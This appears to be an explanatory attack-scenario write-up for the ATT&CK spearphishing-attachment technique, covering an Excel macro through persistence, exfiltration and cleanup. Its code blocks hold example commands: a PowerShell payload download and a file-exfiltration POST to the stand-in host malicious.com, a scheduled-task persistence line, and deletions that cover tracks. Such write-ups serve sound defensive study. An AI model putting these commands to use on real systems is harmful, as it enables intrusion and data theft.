Pattern Name: T1566.001 (Spearphishing Attachment)
Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment designed to exploit a vulnerability in Microsoft Excel. The attack progresses from the initial email interaction to the execution of a payload that establishes a foothold in the victim's environment, ultimately leading to data exfiltration.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Applications Involved**: Outlook
- **User Actions**: The user receives an email with a subject line "Important Update" and an attachment named "Invoice_2023.xlsx."
- **Key Artifacts**: Email headers, attachment file "Invoice_2023.xlsx."
  
```shell
# The user opens the email in Outlook and clicks on the attachment.
# This action triggers the download of the file to the user's system.
```

**Stage 2: Exploitation of Vulnerability**
- **Applications Involved**: Microsoft Excel
- **User Actions**: The user opens the attachment in Excel, which contains a macro designed to execute malicious code.
- **Key Artifacts**: Excel file with macros enabled, temporary files created during macro execution.

```shell
# The macro in the Excel file executes a PowerShell command to download a payload.
# Example PowerShell command executed by the macro:
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile '%temp%\\payload.exe'"
# This command downloads the malicious executable to the temp directory.
```

**Stage 3: Execution of Malicious Payload**
- **Applications Involved**: Windows Explorer, PowerShell
- **User Actions**: The macro executes the downloaded payload.
- **Key Artifacts**: Executable file "payload.exe" in the %temp% directory.

```shell
# The user is unaware that the macro has executed the payload.
# The payload is executed silently.
%temp%\\payload.exe
```

**Stage 4: Establishing Persistence**
- **Applications Involved**: Windows Task Scheduler
- **User Actions**: The payload creates a scheduled task to ensure persistence.
- **Key Artifacts**: Scheduled task entry in Task Scheduler.

```shell
# The payload creates a scheduled task to run at startup.
schtasks /create /tn "MaliciousTask" /tr "%temp%\\payload.exe" /sc onlogon /rl highest
# This ensures the payload runs every time the user logs in.
```

**Stage 5: Data Exfiltration**
- **Applications Involved**: PowerShell, Network
- **User Actions**: The payload collects sensitive data and sends it to the attacker's command and control (C2) server.
- **Key Artifacts**: Network traffic to the C2 server, logs of data being sent.

```shell
# The payload collects data and sends it to the C2 server.
# Example command to exfiltrate data:
powershell -Command "Invoke-WebRequest -Uri 'http://malicious.com/exfil' -Method POST -Body (Get-Content 'C:\\Users\\User\\Documents\\sensitive_data.txt')"
# This command sends the collected data to the attacker's server.
```

**Stage 6: Cleanup and Covering Tracks**
- **Applications Involved**: Windows Explorer, PowerShell
- **User Actions**: The payload deletes its traces to avoid detection.
- **Key Artifacts**: Deleted files, cleared logs.

```shell
# The payload deletes the original Excel file and any temporary files created.
del "%temp%\\Invoice_2023.xlsx"
del "%temp%\\payload.exe"
# It may also clear event logs to remove traces of its execution.
